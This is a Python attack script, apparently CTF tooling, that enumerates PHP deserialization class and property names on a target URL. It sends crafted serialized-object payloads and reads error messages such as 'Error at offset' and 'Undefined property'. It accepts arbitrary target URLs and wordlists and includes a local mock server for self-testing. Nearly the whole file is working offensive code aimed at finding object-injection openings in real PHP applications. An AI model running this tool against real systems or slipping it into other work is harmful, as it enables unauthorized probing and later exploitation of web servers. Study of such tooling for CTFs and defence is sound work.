# -*- coding: utf-8 -*-
"""PHP 反序列化 类名/属性名 爆破(py3 完善版)

来源: https://github.com/wilesanGH/ctf-web (md_docs/php反序列化类名爆破.md 内嵌脚本, 已完善)
原理提示: 类名正确时服务端报错不同(无 "Error at offset"), 属性名存在时无 "Undefined property"。

依赖:
    pip install requests

用法:
    python php_class_brute.py --selftest                       # 自测(本地模拟靶场)
    python php_class_brute.py -u http://target/vuln.php -p p   # 类名字典爆破
    python php_class_brute.py -u http://t/x -p p --class Admin # 指定类名后爆属性名
    python php_class_brute.py -u http://t/x -p p --props cmd,name --class Admin
    python php_class_brute.py -u http://t/x -p p -w myclass.txt
"""
from __future__ import annotations

import argparse
import sys

DEFAULT_CLASSES = [
    'Admin', 'admin', 'User', 'user', 'Login', 'login', 'Manager', 'manager',
    'Member', 'member', 'Guest', 'guest', 'Flag', 'flag', 'Test', 'test',
    'Wllm', 'wllm', 'CTF', 'ctf', 'Index', 'index', 'Main', 'main',
    'FileHandler', 'ReadFile', 'Upload', 'Db', 'Database', 'Config', 'Info',
]

DEFAULT_PROPS = [
    'cmd', 'name', 'user', 'passwd', 'password', 'pass', 'admin', 'flag',
    'code', 'file', 'filename', 'content', 'data', 'value', 'key', 'token',
    'id', 'msg', 'username', 'email', 'src', 'url', 'path',
]


def class_payload(classname: str) -> str:
    return f'O:{len(classname)}:"{classname}":0:{{}}'


def prop_payload(classname: str, propname: str, value: str = '1') -> str:
    """单属性对象: 触发 Undefined property 对比。"""
    return (f'O:{len(classname)}:"{classname}":1:'
            f'{{s:{len(propname)}:"{propname}";s:{len(value)}:"{value}";}}')


def brute_classes(url, param, classes, extra_marker=None):
    """类名爆破: 无 offset 报错即候选命中。"""
    import requests
    hits = []
    for cn in classes:
        try:
            r = requests.get(url, params={param: class_payload(cn)}, timeout=8)
        except Exception as e:
            print(f'[!] 请求失败: {e}')
            break
        text = r.text
        bad = ('Error at offset' in text) or ('unserialize' in text.lower()
                                              and 'offset' in text.lower())
        if extra_marker and extra_marker in text:
            bad = False
        if not bad:
            hits.append(cn)
            print(f'[+] 可能的类名: {cn}  (payload: {class_payload(cn)})')
    return hits


def brute_props(url, param, classname, props):
    """属性名爆破: 属性存在时不再报 Undefined property。"""
    import requests
    hits = []
    for pn in props:
        try:
            r = requests.get(url, params={param: prop_payload(classname, pn)},
                             timeout=8)
        except Exception as e:
            print(f'[!] 请求失败: {e}')
            break
        if 'Undefined property' not in r.text:
            hits.append(pn)
            print(f'[+] 可能的属性名: {pn}')
    return hits


def main():
    ap = argparse.ArgumentParser(description='PHP 反序列化类名/属性名爆破')
    ap.add_argument('-u', '--url')
    ap.add_argument('-p', '--param', default='p', help='payload 参数名(默认 p)')
    ap.add_argument('-w', '--wordlist', help='自定义类名字典')
    ap.add_argument('--class', dest='cls', help='已知类名(进入属性爆破阶段)')
    ap.add_argument('--props', default='', help='自定义属性名字典, 逗号分隔')
    ap.add_argument('--marker', default='', help='类名命中额外特征串')
    ap.add_argument('--selftest', action='store_true')
    args = ap.parse_args()

    if args.selftest:
        import threading
        import http.server
        import socketserver
        import urllib.parse

        SECRET_CLASS, SECRET_PROP = 'Admin', 'cmd'

        class H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                qs = urllib.parse.parse_qs(
                    urllib.parse.urlparse(self.path).query)
                payload = qs.get('p', [''])[0]
                # 模拟 PHP 行为: 类不存在报 offset; 类存在属性不存在报 Undefined property
                if payload.startswith(f'O:{len(SECRET_CLASS)}:"{SECRET_CLASS}":0:'):
                    body = b'Notice: demo'                # 类名正确
                elif payload.startswith(f'O:{len(SECRET_CLASS)}:"{SECRET_CLASS}":1:'):
                    if f'"{SECRET_PROP}"' in payload:
                        body = b'OK'                      # 属性名正确
                    else:
                        body = b'Warning: Undefined property: Admin::$x'
                elif payload.startswith('O:'):
                    body = b'Warning: unserialize(): Error at offset 33'
                else:
                    body = b'hello'
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):
                pass

        srv = socketserver.TCPServer(('127.0.0.1', 0), H)
        port = srv.server_address[1]
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            url = f'http://127.0.0.1:{port}/'
            hits = brute_classes(url, 'p', DEFAULT_CLASSES)
            good = SECRET_CLASS in hits
            print(f"[{'OK' if good else 'FAIL'}] 类名爆破命中: {hits}")
            props = brute_props(url, 'p', SECRET_CLASS, DEFAULT_PROPS)
            good2 = SECRET_PROP in props
            ok = good and good2
            print(f"[{'OK' if good2 else 'FAIL'}] 属性名爆破命中: {props}")
        finally:
            srv.shutdown()
        sys.exit(0 if ok else 1)

    if not args.url:
        ap.error('-u 必填(--selftest 自测)')
    classes = DEFAULT_CLASSES
    if args.wordlist:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            classes = [x.strip() for x in f if x.strip()]
    if args.cls:
        props = ([x.strip() for x in args.props.split(',') if x.strip()]
                 or DEFAULT_PROPS)
        brute_props(args.url, args.param, args.cls, props)
    else:
        brute_classes(args.url, args.param, classes, args.marker or None)


if __name__ == '__main__':
    main()
